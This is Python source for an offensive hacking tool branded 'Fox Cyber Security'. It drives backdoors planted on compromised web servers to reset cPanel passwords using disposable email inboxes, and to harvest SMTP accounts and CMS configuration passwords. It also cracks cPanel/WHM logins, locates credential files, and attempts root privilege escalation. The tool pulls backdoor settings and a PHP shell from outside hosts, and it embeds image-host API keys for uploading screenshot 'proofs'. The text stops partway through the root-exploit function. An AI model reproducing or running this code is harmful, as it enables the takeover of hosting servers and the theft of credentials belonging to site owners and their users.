def modelsInstaller():
    try :
        models = ['requests', 'colorama', 'mechanize', 'selenium', 'imgurpython', 'python-gyazo']
        for model in models:
            try:
                if (sys.version_info[0] < 3):
                    os.system('cd C:\Python27\Scripts & pip install {}'.format(model))
                else :
                    os.system('py -m pip install {}'.format(model))
                print (' ')
                print (' [+] {} has been installed successfully, Restart the program.'.format(model))
                print (' ')
            except:
                print (' [-] Install {} manually.'.format(model))
                print (' ')
    except:
        pass

import re, sys, os, random, string, time, ssl, json, socket, base64, platform, codecs, binascii, glob, shutil
from time import time as timer
try :
    import requests, mechanize, selenium, imgurpython, gyazo
    from selenium.webdriver.common.by import By
    from colorama import Fore
    from colorama import init
except :
    modelsInstaller()

init(autoreset=True)
requests.packages.urllib3.disable_warnings()

fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
fm = Fore.MAGENTA
fy = Fore.YELLOW
fb = Fore.BLUE
flb = Fore.LIGHTBLUE_EX
flc = Fore.LIGHTCYAN_EX
flg = Fore.LIGHTGREEN_EX
flm = Fore.LIGHTMAGENTA_EX
flr = Fore.LIGHTRED_EX
fly = Fore.LIGHTYELLOW_EX

def domain_Fox(site):
    site = str(site)
    if (site.startswith("http://")) : site = site.replace("http://", "")
    elif (site.startswith("https://")) : site = site.replace("https://", "")
    if ('www.' in site) : site = site.replace("www.", "")
    if ('/' in site):
        site = site.rstrip()
        site = site.split('/')[0]
    return str(site)

def URL_FOX(site):
    site = str(site)
    if (site.startswith('http://')) : site = site.replace('http://', ''); p = 'http://'
    elif (site.startswith('https://')) : site = site.replace('https://', ''); p = 'https://'
    else : p = 'http://'
    if ('/' in site): site = site.rstrip().split('/')[0]
    return '{}{}'.format(p, site)

def URL_P(panel):
    try:
        admins = ['/wp-login.php', '/admin', '/user']
        for admin in admins:
            if (str(admin) in str(panel)): return re.findall(re.compile('(.*){}'.format(admin)), panel)[0]
        return str(panel).decode('utf8')
    except:
        return str(panel)

def shell_Form(shell_URL):
    try:
        shell_URL = str(shell_URL)
        if (not shell_URL.startswith('http://') and not shell_URL.startswith('https://')): shell_URL = 'http://{}'.format(shell_URL)
        return str(shell_URL)
    except:
        return str(shell_URL)

def input_Fox(txt):
    try :
        if (sys.version_info[0] < 3): return raw_input(txt).strip()
        else :
            sys.stdout.write(txt)
            return input().strip()
    except:
        pass

def file_get_contents_Fox(filename):
    with open(filename) as f: return f.read()

def file_get_contents_Fox2(filename):
    with open(filename, 'rb') as f: return f.read()

def Random_array_Fox(arr):
    for n in range(len(arr) - 1):
        rnd = random.randint(0, (len(arr) - 1))
        val1 = arr[rnd]
        val2 = arr[rnd - 1]
        arr[rnd - 1] = val1
        arr[rnd] = val2
    return arr

def shellPath_Fox(url, filename, ty):
    try:
        url = str(url)
        if ('?' in url): url = url.split('?')[0]
        if (ty == 1): shell_path = url.replace(url.split('/')[-1], filename)
        if (ty == 2): shell_path = '{}/{}'.format(URL_FOX(url), filename)
        return str(shell_path)
    except:
        return False

def random_Fox(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))


def imgurproof(argument):
    try :
        from imgurpython import ImgurClient
        imgurapi=ImgurClient('dfb8c853b85d19f','c022256a3d5f14b2541f2d122ebbaff19a8fa6a9')
        response=imgurapi.upload_from_path('screenshots/{}'.format(argument), config = None , anon = True)
        return response['link']
    except :
        return False

def gyazoproof(argument):
    try :
        from gyazo import Api
        client=Api( access_token = 'goVyPHZD44tWGZLvDt6fA3h4YcvNUw8r4-xwm6n31v8')
        with open('screenshots/{}'.format(argument),'rb') as file:
            upload=client.upload_image(file)
            json_response=json.loads(upload.to_json())
            json_response=json_response['url']
            return json_response
    except :
        print('')
        print("   {}[!] Error [can't upload proofs], You have to change your IP by VPN.".format(fr))
        print('')
        return False
    
def content_Fox(req):
    if (sys.version_info[0] < 3):
        try:
            try: return str(req.content)
            except:
                try: return str(req.content.encode('utf-8'))
                except: return str(req.content.decode('utf-8'))
        except: return str(req.text)
    else:
        try:
            try: 
                return str(req.content.decode('utf-8'))
            except:
                try: return str(req.content.encode('utf-8'))
                except: return str(req.text)
        except: return str(req.content)

def passwrod_creator():
    try:
        lower = string.ascii_lowercase
        upper = string.ascii_uppercase
        num = string.digits
        symbols = '!#%^*_-=/?.!#%^*_-=/?.!#%^*_-=/?.!#%^*_-=/?.'
        pwd = '{}{}{}{}'.format(lower, upper, num, symbols)
        temp = random.sample(pwd, 12)
        password = "".join(temp)
        SpecialSym = ['!', '#', '%', '^', '*', '_', '-', '=', '/', '?', '.']
        while(not any(char.isdigit() for char in password) or not any(char.isdigit() for char in password) or not any(char.isupper() for char in password) or not any(char in SpecialSym for char in password)):
            temp = random.sample(pwd, 12)
            password = "".join(temp)
        return '{}{}'.format(random_Fox(1), password)
    except:
        return False

def getError(ty):
    if (ty == 1):
        print('   [-] {}Make sure you are connected to the internet.'.format(fr))
        print('   [-] {}OR You must to change your IP/RDP.'.format(fr))
    else: 
        print('   [-] {}You must to change your IP/RDP.'.format(fr))
    print('   [!] Or Do a report for Fox, Telegram: {}@Anonymous_F0x\n'.format(fc))

def getinfoFox():
    global headers1, backdoor1, backdoor2, backdoor3, backdoor4
    try :
        domains=['ufox.co', 'ufox.bz']
        for domain in domains:
            try:
                r=requests.get('http://{}/info/info_v8.txt'.format(domain), headers = headers1, verify = False, timeout = 15)
                r=content_Fox(r)
                if (re.findall(re.compile("\\'script\\': \\'(.*)\\'"),r)): 
                    break
            except:
                pass
        if (re.findall(re.compile("\\'script\\': \\'(.*)\\'"),r)):
            __script__=re.findall(re.compile("\\'script\\': \\'(.*)\\'"),r)
        else:
            getError(1); 
            return False
        backdoor1=re.findall(re.compile("\\'files\\': \\'(.*)\\'"),r)
        backdoor2=re.findall(re.compile("\\'UP\\': \\'(.*)\\'"),r)[0]
        backdoor3=re.findall(re.compile("\\'A\\': \\'(.*)\\'"),r)[0]
        backdoor4=re.findall(re.compile("\\'M\\': \\'(.*)\\'"),r)[0]
    except Exception as E:
        getError(1)
        return False
        
def log():
    logo = '''
{}   [{}#{}] Create ::
{}                                   ##################                     
{}    #                           ##########################                
{}    ############               ##############################             
{}     ###############          ##################################          
{}       ################      #####################################        
{}        ################     #######################################      
{}         #################    #######################################     
{}         ##################    #######################################    
{}          ##################     ######################################   
{}          ###################        ##########       ##################  
{}          ####################          ####          ################### 
{}          ####################                        ####################
{}          ####################                        ####################
{}          ####################                        ####################
{}          ####################                        ####################
{}          ####################                        ####################
{}          ###################                          ###################
{}          ###################    ##              ##     ##################
{}           #################      ####        ####     ################## 
{}           ###################                         ################## 
{}            #######################               ######################  
{}             #########################         ########################   
{}              ##########################     #########################    
{}               ########################### ##########################     
{}                 ###################################################      
{}                  ################################################        
{}                     ###########################################          
{}                       ######################################             
{}                          ################################                
{}                               #######################                      

                                  {}F{}ox{}C{}yber{}S{}ecurity.
'''.format(fw, fr, fw, fg, fg, fg, fg, fg, fg, fg, fg, fg, fg, fg, fg, fg, fg, fg, fg, fg, fg, fg, fg, fg, fg, fg, fg, fg, fg, fg, fg, fg, fg, fy, fw, fy, fw, fy, fw)
    for line in logo.split("\n"):
        print(line)
        time.sleep(0.06)

headers1={'Connection': 'keep-alive', 'Cache-Control': 'max-age=0', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-GB,en;q=0.5'}
            

headers2 = {'Connection': 'keep-alive', 'Cache-Control': 'max-age=0', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36', 'Cookie': 'POST=n1zb/ma5\\vt0i28-pxuqy*6lrkdg9_ehcswo34*f37jMDgQuFPkCVGmOdnrNEjeLKtZocSxfvTIRUzlYWHyqhaXswBpiAbJ', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-GB,en;q=0.5'}

def shellFox():
    try:
        global shell_Fox
        getFile('bk.txt', '96701795824345681')
        shell_Fox = file_get_contents_Fox('Files/bk.txt')
        if ('<?php' not in shell_Fox): 
            getError(0);
            return False
    except Exception as E:
        print(f"Error : {E}")
        getError(0);
        return False

def requestG_Fox(url, typ, headers, timeout = 20):
    try:
        timeout2 = timeout + 10
        try: check = requests.get(url, headers=headers, verify=False, timeout=timeout)
        except: check = requests.get(url, headers=headers, verify=False, timeout=timeout2)
        if ( typ == 1 ) : return content_Fox(check)
        else: return check
    except:
        return False

def requestP_Fox(url, typ, post, headers, timeout = 20):
    try:
        timeout2 = timeout + 10
        try: check = requests.post(url, data=post, headers=headers, verify=False, timeout=timeout)
        except: check = requests.post(url, data=post, headers=headers, verify=False, timeout=timeout2)
        if ( typ == 1 ) : return content_Fox(check)
        else: return check
    except :
        return False

def getEmail():
    try:
        gm = requestG_Fox('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1', 1, headers1)
        if(not re.findall(re.compile('\["(.*)"\]'), gm)): return 'F'
        email = re.findall(re.compile('\["(.*)"\]'), gm)[0]
        return str(email)
    except:
        return 'F'

def get_SCode_Fox(email):
    try:
        user = email.split('@')[0]
        domain = email.split('@')[1]
        ck_id = requestG_Fox('https://www.1secmail.com/api/v1/?action=getMessages&login={}&domain={}'.format(user, domain), 0, headers1)
        msgID = ck_id.json()[0]["id"]
        ck_msg = requestG_Fox('https://www.1secmail.com/api/v1/?action=readMessage&login={}&domain={}&id={}'.format(user, domain, msgID), 0, headers1)
        msg = ck_msg.json()["body"].encode('utf8').decode('utf8')
        if(re.findall(re.compile('bold">(.*)</p>'), msg)): code = re.findall(re.compile('bold">(.*)</p>'), msg)[0]
        elif(re.findall(re.compile('bold\">(.*)<\/p>'), msg)): code = re.findall(re.compile('bold\">(.*)<\/p>'), msg)[0]
        elif (re.findall(re.compile('bold\\">(.*)<\\/p>'), msg)): code = re.findall(re.compile('bold\\">(.*)<\\/p>'), msg)[0]
        if('<' in str(code)): code = str(code).split('<')[0]
        return str(code)
    except:
        return 'F'

def msg_chekcer_Fox(email, code):
    try:
        user = email.split('@')[0]
        domain = email.split('@')[1]
        ck_sj = requestG_Fox('https://www.1secmail.com/api/v1/?action=getMessages&login={}&domain={}'.format(user, domain), 1, headers1)
        #subject = ck_sj.json()[0]["subject"]
        if (str(code) in ck_sj): return 'S'
        return 'F'
    except:
        return 'F'

def en(string):
    return binascii.hexlify(str(codecs.encode(string,'rot13')).encode('utf8')).decode('utf8')[::-1]

def delete_files(folder, exc):
    try:
        files = glob.glob("{}/*.{}".format(folder, exc))
        for file in files:
            try:
                os.remove(file)
            except:
                pass
    except:
        pass

def resetPwdA_Fox(backdoor, urlShell) :
    try:
        global success1, success2
        sys.stdout.write('   {}[*] Reset cPanel Password Automatically '.format(fw)); waiting()
        post = {'action': 'reseta'}
        resetPwd = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), 1, post, headers2)
        if ('<cpanel>' in resetPwd) :
            cp = re.findall(re.compile('<cpanel>(.*)</cpanel>'), resetPwd)[0]
            print ('   {}[+] Succeeded.\n       - {}{}'.format(fg, fr, cp))
            open('Results/cPanels_Reseted.txt', 'a').write('{}\n'.format(cp)); success1 = 1
        elif (re.findall(re.compile('<error>(.*)</error>'), resetPwd)) : print ('   {}[-] {}.'.format(fr, re.findall(re.compile('<error>(.*)</error>'), resetPwd)[0]))
        else :
            email = getEmail()
            if (email == 'F'):
                print ('   {}[-] Reset Password Failed.\n   {}[!] Try {}[Semi-Automatic].'.format(fr, fw, fr))
                open('Results/Try_Rest_cPanel_Semi_Automatic.txt', 'a').write('{}\n'.format(urlShell)); success2 = 1
                return
            post_e = {'action': 'resets', 'email': email}
            resetPwd = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), 1, post_e, headers2)
            time.sleep(10)
            code = get_SCode_Fox(email)
            start = timer()
            while ((code == 'F') and ((timer() - start) <= 90)):
                time.sleep(10)
                code = get_SCode_Fox(email)
            if (code == 'F') :
                print ('   {}[-] Reset Password Failed.\n   {}[!] Try {}[Semi-Automatic].'.format(fr, fw, fr))
                open('Results/Try_Rest_cPanel_Semi_Automatic.txt', 'a').write('{}\n'.format(urlShell)); success2 = 1
                return
            post_c = {'action': 'resets', 'code': code}
            resetPwd = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), 1, post_c, headers2)
            if ('<cpanel>' in resetPwd):
                cp = re.findall(re.compile('<cpanel>(.*)</cpanel>'), resetPwd)[0]
                print ('   {}[+] Succeeded.\n       - {}{}'.format(fg, fr, cp))
                open('Results/cPanels_Reseted.txt', 'a').write('{}\n'.format(cp)); success1 = 1
            else:
                print ('   {}[-] Reset Password Failed.\n   {}[!] Try {}[Semi-Automatic].'.format(fr, fw, fr))
                open('Results/Try_Rest_cPanel_Semi_Automatic.txt', 'a').write('{}\n'.format(urlShell)); success2 = 1
    except:
        print ('   {}[-] Reset Password Failed.\n   {}[!] Try {}[Semi-Automatic].'.format(fr, fw, fr))
        open('Results/Try_Rest_cPanel_Semi_Automatic.txt', 'a').write('{}\n'.format(urlShell)); success2 = 1

def resetPwdS_Fox(backdoor, urlShell, email) :
    try:
        global success1, success2
        sys.stdout.write('   {}[*] Reset cPanel Password Semi-Automatically '.format(fw)); waiting()
        post_e = {'action': 'resets', 'email': email}
        resetPwd = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), 1, post_e, headers2)
        if ('<cpanel>' in resetPwd) :
            cp = re.findall(re.compile('<cpanel>(.*)</cpanel>'), resetPwd)[0]
            print ('   {}[+] Succeeded.\n       - {}{}'.format(fg, fr, cp))
            open('Results/cPanels_Reseted.txt', 'a').write('{}\n'.format(cp)); success1 = 1
        elif (re.findall(re.compile('<error>(.*)</error>'), resetPwd)) : print ('   {}[-] {}.'.format(fr, re.findall(re.compile('<error>(.*)</error>'), resetPwd)[0])); return
        print('   {}[+] The system sent the security code to your email.'.format(fg))
        code = str(input_Fox('   {}[!] Enter the security code :{} '.format(fw, fr))).strip()
        if (code == ''):
            print ('   {}[-] The code is wrong.'.format(fr))
            open('Results/Try_Rest_cPanel_manually.txt', 'a').write('{}\n'.format(urlShell)); success2 = 1
            return
        post_c = {'action': 'resets', 'code': code}
        resetPwd = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), 1, post_c, headers2)
        if ('<cpanel>' in resetPwd):
            cp = re.findall(re.compile('<cpanel>(.*)</cpanel>'), resetPwd)[0]
            print ('   {}[+] Succeeded.\n       - {}{}'.format(fg, fr, cp))
            open('Results/cPanels_Reseted.txt', 'a').write('{}\n'.format(cp)); success1 = 1
        else:
            print ('   {}[-] Reset Password Failed.'.format(fr))
            open('Results/Try_Rest_cPanel_manually.txt', 'a').write('{}\n'.format(urlShell)); success2 = 1
    except:
        print ('   {}[-] Reset Password Failed.'.format(fr))
        open('Results/Try_Rest_cPanel_manually.txt', 'a').write('{}\n'.format(urlShell)); success2 = 1

def SMTPs_finder(backdoor) :
    try:
        global success1
        sys.stdout.write('   {}[*] Finding SMTPs '.format(fw)); waiting()
        post_f = {'action': 'smtps'}
        SMTP_F = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), 1, post_f, headers2)
        if ('Error-SMTP' in SMTP_F) : print ('   {}[-] Another someone has already withdraw it.'.format(fr))
        elif ('<findersmtp>' in SMTP_F) :
            if (re.findall(re.compile('<findersmtp>(.*)</findersmtp>'), SMTP_F)): SMTPs = re.findall(re.compile('<findersmtp>(.*)</findersmtp>'), SMTP_F)
            print ('   {}[+] Succeeded.'.format(fg))
            for SMTP in SMTPs:
                if ('!!' in SMTP): SMTP = SMTP.replace('!!', '@')
                print('       {}- {}{}'.format(fg, fr, SMTP))
                open('Results/SMTPs.txt', 'a').write('{}\n'.format(SMTP)); success1 = 1
        else: print ('   {}[-] There is no SMTP.'.format(fr))
    except:
        print ('   {}[-] Failed.'.format(fr))

def SMTP_creator(backdoor) :
    try:
        global success2
        sys.stdout.write('   {}[*] Creating SMTP '.format(fw)); waiting()
        post_g = {'action': 'smtp'}
        SMTP_C = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), 1, post_g, headers2)
        if ('<smtp>' in SMTP_C) :
            smtpC = re.findall(re.compile('<smtp><domain>Domian => (.*)</domain><port><br>Port => (.*)</port><smtpname><br>SMTPname => (.*)</smtpname><password><br>Password => (.*)</password></smtp>'), SMTP_C)[0]
            smtp = '{}|{}|{}@{}|{}'.format(smtpC[0], smtpC[1], smtpC[2], smtpC[0], smtpC[3])
            print ('   {}[+] Succeeded.\n       - {}{}'.format(fg, fr, smtp))
            open('Results/SMTPs_Created.txt', 'a').write('{}\n'.format(smtp)); success2 = 1
        else: print ('   {}[-] There is no WebMail.'.format(fr))
    except:
        print ('   {}[-] Failed.'.format(fr))

def SMTPs(backdoor) :
    try:
        SMTPs_finder(backdoor)
        SMTP_creator(backdoor)
    except:
        pass

def info(backdoor, shell) :
    try:
        global success1, success2, success3
        txtSav = ''
        sys.stdout.write('   {}[*] INFO '.format(fw)); waiting()
        post_f = {'action': 'info'}
        sc_F = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), 1, post_f, headers2)
        uname = re.findall(re.compile('<uname><font color="red"><center>(.*)</center></font><br></uname>'), sc_F)[0]
        pwd = re.findall(re.compile('<pwd><font color="blue"><center>(.*)</center></font><br></pwd>'), sc_F)[0]
        ip = re.findall(re.compile('<ip><font color="blue"><center>(.*)</center></font><br></ip>'), sc_F)[0]
        phpv = re.findall(re.compile('<php><center>(.*)</center><br></php>'), sc_F)[0]
        hosting = re.findall(re.compile('<hosting><center>(.*)</center><br></hosting>'), sc_F)[0]
        country = re.findall(re.compile('<country><center>(.*)</center><br></country>'), sc_F)[0]
        txtSav = '{}{}'.format(txtSav, '{}\n'.format(shell))
        print ('   {}[U] {}'.format(fm, uname)); txtSav = '{}{}'.format(txtSav, 'Uname: {}\n'.format(uname))
        print ('   {}[P] {}'.format(fm, pwd)); txtSav = '{}{}'.format(txtSav, 'PWD: {}\n'.format(pwd))
        if ('[-] Windows' in sc_F):
            print ('   {}[*] OS: {}Windows'.format(fr, fg)); txtSav = '{}{}'.format(txtSav, 'OS: Windows\n')
            open('Results/Windows_servers.txt', 'a').write('{}\n'.format(shell))
        else:
            print ('   {}[*] OS: {}Linux'.format(fr, fg)); txtSav = '{}{}'.format(txtSav, 'OS: Linux\n')
            if (' 2015 ' in uname or ' 2014 ' in uname or ' 2013 ' in uname or ' 2012 ' in uname or ' 2011 ' in uname or ' 2010 ' in uname): open('Results/Roots_servers.txt', 'a').write('{}\n'.format(shell))
            elif (' 2016 ' in uname):
                if (' Dec ' not in uname and ' Nov ' not in uname): open('Results/Roots_servers.txt', 'a').write('{}\n'.format(shell)); success2 = 1
            if ('[+] cPanel' in sc_F):
                print ('   {}[*] SC: {}cPanel'.format(fr, fg)); txtSav = '{}{}'.format(txtSav, 'SC: cPanel\n')
                open('Results/cPanel_servers.txt', 'a').write('{}\n'.format(shell)); success3 = 1
            elif ('[+] vHosts' in sc_F):
                print ('   {}[*] SC: {}vHosts'.format(fr, fg)); txtSav = '{}{}'.format(txtSav, 'SC: vHosts\n')
                open('Results/vHosts_servers.txt', 'a').write('{}\n'.format(shell))
        print ('   {}[*] PHP: {}{}'.format(fr, fg, phpv)); txtSav = '{}{}'.format(txtSav, 'PHP: {}\n'.format(phpv))
        print ('   {}[*] IP: {}{}'.format(fr, fg, ip)); txtSav = '{}{}'.format(txtSav, 'IP: {}\n'.format(ip))
        print ('   {}[*] Hosting: {}{}'.format(fr, fg, hosting)); txtSav = '{}{}'.format(txtSav, 'Hosting: {}\n'.format(hosting))
        print ('   {}[*] Conuntry: {}{}'.format(fr, fg, country)); txtSav = '{}{}'.format(txtSav, 'Conuntry: {}\n'.format(country))
        if(re.findall(re.compile('<domains><center>(.*)</center><br></domains>'), sc_F)):
            domains = re.findall(re.compile('<domains><center>(.*)</center><br></domains>'), sc_F)[0]
            try: domains = int(domains)
            except: domains = 0
            if(domains != 0):
                print ('   {}[*] Domains: {}{}'.format(fr, fg, domains))
                txtSav = '{}{}'.format(txtSav, 'Domains: {}\n'.format(domains))
        open('Results/info_servers.txt', 'a').write('{}--------------------------------------------------------------------------------------------------\n'.format(txtSav)); success1 = 1
    except :
        print('   {}[-] Failed.'.format(fr))

def accesshash_mycnf(backdoor, shell) :
    try:
        global success1, success2, backdoor3, backdoor4
        sys.stdout.write('   {}[*] (.accesshash/.my.cnf) Files Finder '.format(fw)); waiting()
        post_a = {'action': 'accesshash'}
        AC_MY = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), 1, post_a, headers2)
        acss = 0
        if ('[+] Accesshash' in AC_MY):
            print ('   {}   -{} {} => {}[{}Accesshash{}]'.format(fr, fg, shell, fr, fg, fr))
            open('Results/accesshash.txt', 'a').write('{}?action={}\n'.format(backdoor, backdoor3)); success1 = 1
            acss = 1
        else: print ('   {}   - {} => [Not Found Accesshash]'.format(fr, shell))
        if ('[+] mycnf' in AC_MY):
            print ('   {}   -{} {} => {}[{}Mycnf{}]'.format(fr, fg, shell, fr, fg, fr))
            open('Results/mycnf.txt', 'a').write('{}?action={}\n'.format(backdoor, backdoor4)); success2 = 1
        else: print ('   {}   - {} => [Not Found Mycnf]'.format(fr, shell))
        if (acss == 1): WHM_AH_exploiter(backdoor)
    except:
        print ('   {}[-] Failed.'.format(fr))

def configs(backdoor, shell):
    try:
        sys.stdout.write('   {}[*] Trying get Configs '.format(fw)); waiting()
        post_c = {'action': 'config'}
        try: conf = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/b'.format(dom, to, version))), data=post_c, headers=headers2, verify=False, timeout=240))
        except: conf = ''
        if('</config>' not in conf):
            post_f = {'action': 'finder', 'action1': '200'}
            conf = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/b'.format(dom, to, version))), 1, post_f, headers2)
        folder = re.findall(re.compile('<config>(.*)</config>'), conf)[0]
        cf_path = shellPath_Fox(backdoor, '{}/'.format(folder), 1)
        ck_conf = requestG_Fox(cf_path, 1, headers1, 500)
        if ('Index of' in ck_conf):
            print ('   {}[+] Configs => {}{}'.format(fg, fr, cf_path))
            if('.txt' not in ck_conf): print ('   {}[-] There is no Config.'.format(fr)); return False
            sc_F = str(script_Finder(backdoor, cf_path, shell))
            if (sc_F == '101'): print ('   {}[-] Please, try manually.'.format(fr)); return False
            elif (sc_F == '404'):
                print ('   {}[-] 404 Config.'.format(fr))
                cf_path = configs404(backdoor, shell)
                if (cf_path is False): return False
                else: return cf_path[0], cf_path[1]
            else: print (sc_F); return cf_path, ck_conf
        else: print ('   {}[-] Failed.1'.format(fr)); return False
    except :
        return False

def configs404(backdoor, shell):
    try:
        sys.stdout.write('   {}[*] Trying get Configs{}404 '.format(fw, fr)); waiting()
        post_c = {'action': '404'}
        try: conf404 = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/b'.format(dom, to, version))), data=post_c, headers=headers2, verify=False, timeout=300))
        except: conf404 = ''
        if('</config>' not in conf404):
            post_f = {'action': 'finder', 'action1': '404'}
            conf404 = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/b'.format(dom, to, version))), 1, post_f, headers2)
        folder = re.findall(re.compile('<config>(.*)</config>'), conf404)[0]
        cf_path = shellPath_Fox(backdoor, '{}/'.format(folder), 1)
        ck_conf = requestG_Fox(cf_path, 1, headers1, 500)
        if ('Index of' in ck_conf):
            print ('   {}[+] Configs{}404{} => {}{}'.format(fg, fr, fg, fr, cf_path))
            sc_F = str(script_Finder(backdoor, cf_path, shell, '404'))
            if (sc_F == '404' or sc_F == '101'): print ('   {}[-] There is no Config.'.format(fr)); return False
            else: print (sc_F); return cf_path, ck_conf
        else: print ('   {}[-] Failed.'.format(fr)); return False
    except:
        print ('   {}[-] Failed.'.format(fr)); return False

def HTML_cleaner(src):
    try:
        src = str(src)
        if ('&amp;' in src): src = src.replace('&amp;', '&')
        if ('&lt;' in src): src = src.replace('&lt;', '<')
        if ('&gt;' in src): src = src.replace('&gt;', '>')
        return str(src)
    except:
        return str(src)

def script_Finder(backdoor, configsURL, shell, typ = '200'):
    rz = '404'
    global passwordsTXT, whmcsS, success1
    whmcsS = []
    try:
        sys.stdout.write('   {}[*] Trying Check Scripts '.format(fw)); waiting()
        post_c = {'action': 'password', 'action1': typ, 'url': configsURL}
        sc_F = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), 1, post_c, headers2, 500)
        if (re.findall(re.compile('<error>(.*)</error>'), sc_F)): rz = re.findall(re.compile('<error>(.*)</error>'), sc_F)[0]
        elif ('<password>' in sc_F):
            if (re.findall(re.compile('<br><password>(.*)</password>'), sc_F)):
                passwords = re.findall(re.compile('<br><password>(.*)</password>'), sc_F)
                passwordsTXT = ''
                for password in passwords:
                    password = HTML_cleaner(str(password))
                    passwordsTXT = '{}{}\n'.format(passwordsTXT, password)
            if (re.findall(re.compile('<br><whmcs>(.*)</whmcs>'), sc_F)):
                whmcs = re.findall(re.compile('<br><whmcs>(.*)</whmcs>'), sc_F)
                for whm in whmcs:
                    whmcsS.append(whm)
            if (re.findall(re.compile('<br><wordpress>(.*)</wordpress><br>'), sc_F)):
                countWP = int(re.findall(re.compile('<br><wordpress>(.*)</wordpress><br>'), sc_F)[0])
            else: countWP = 0
            if (re.findall(re.compile('<br><joomla>(.*)</joomla><br>'), sc_F)):
                countJM = int(re.findall(re.compile('<br><joomla>(.*)</joomla><br>'), sc_F)[0])
            else: countJM = 0
            if (re.findall(re.compile('<br><opencart>(.*)</opencart><br>'), sc_F)):
                countOC = int(re.findall(re.compile('<br><opencart>(.*)</opencart><br>'), sc_F)[0])
            else: countOC = 0
            rz = '   {}[+] Found {}{}{} WordPress Configs, {}{}{} Joomla Configs, {}{}{} OpenCart Configs'.format(fg, fr, countWP, fg, fr, countJM, fg, fr, countOC, fg)
            if(whmcsS): rz = '{}\n   {}[+] Found {}WHMCS'.format(rz, fg, flb)
            open('Results/Configs.txt', 'a').write('Shell => {}\nConfig => {}\n[+] Found {} WordPress Config, {} Joomla Config, {} OpenCart Config\n--------------------------------------------------------------------------------------------------\n'.format(shell, configsURL, countWP, countJM, countOC)); success1 = 1
        return rz
    except:
        return rz

def cPanels_Cracker(backdoor) :
    try:
        global success2, success3
        sys.stdout.write('   {}[*] cPanels-WHM Crack '.format(fw)); waiting()
        post_c = {'action': 'users'}
        cp_us = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/c'.format(dom, to, version))), 1, post_c, headers2)
        usernames = re.findall(re.compile('<user>(.*)</user>'), cp_us)
        usernamesTXT = ''
        for username in usernames: usernamesTXT = '{}{}\n'.format(usernamesTXT,  str(username))
        post_ck = {'action': 'cp', 'passwords': passwordsTXT, 'usernames': usernamesTXT}
        cp_ck = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/c'.format(dom, to, version))), 1, post_ck, headers2, 1000)
        if ('<good>0<good>' in cp_ck): print ('   {}[-] Found 0 cPanel.'.format(fr))
        else:
            n = re.findall(re.compile('<good>(.*)<good>'), cp_ck)[0]
            if (re.findall(re.compile('<reseller>(.*)</reseller>'), cp_ck)): cpanelRs = re.findall(re.compile('<reseller>(.*)</reseller>'), cp_ck)
            if (re.findall(re.compile('<cp>(.*)</cp>'), cp_ck)): cpanels = re.findall(re.compile('<cp>(.*)</cp>'), cp_ck)
            print ('   {}[+] Found {} cPanel.'.format(fg, n))
            if ('cpanels' in locals()):
                for cpanel in cpanels:
                    cpanel = HTML_cleaner(cpanel)
                    print('   {}    - {}{}'.format(fg, fr, cpanel))
                    open('Results/cPanels_Cracked.txt', 'a').write('{}\n'.format(cpanel)); success2 = 1
            if ('cpanelRs' in locals()):
                for cpanelR in cpanelRs:
                    cpanelR = HTML_cleaner(cpanelR)
                    print ('   {}    - {}{} [{}Reseller{}]'.format(fr, fg, cpanelR, fr, fg))
                    open('Results/cPanels_Cracked.txt', 'a').write('{}\n'.format(cpanelR)); success2 = 1
                    cpRs = cpanelR.replace(':2083', ':2087')
                    open('Results/WHM_Resellers_Cracked.txt', 'a').write('{}\n'.format(cpRs)); success3 = 1
                WHM_exploiter(backdoor, cpanelRs)
    except:
        print ('   {}[-] Please, try manually.'.format(fr))

def rooter(backdoor, shell) :
    try:
        global success1
        sys.stdout.write('   {}[*] Trying get Root '.format(fw)); waiting()
        post_r = {'action': 'root'}
        try: g_root = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), data=post_r, headers=headers2, verify=False, timeout=300))
        except: g_root = ''
        if ('Error2-Root' in g_root): print ('   {}[-] It doesn\'t work with ./dirty.'.format(fr)); return
        if (g_root == ''): time.sleep(15)
        post_k = {'action': 'check'}
        ck_rt = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), 1, post_k, headers2)
        if('<root>' not in ck_rt): print ('   {}[-] It didn\'t work with ./dirty.'.format(fr))
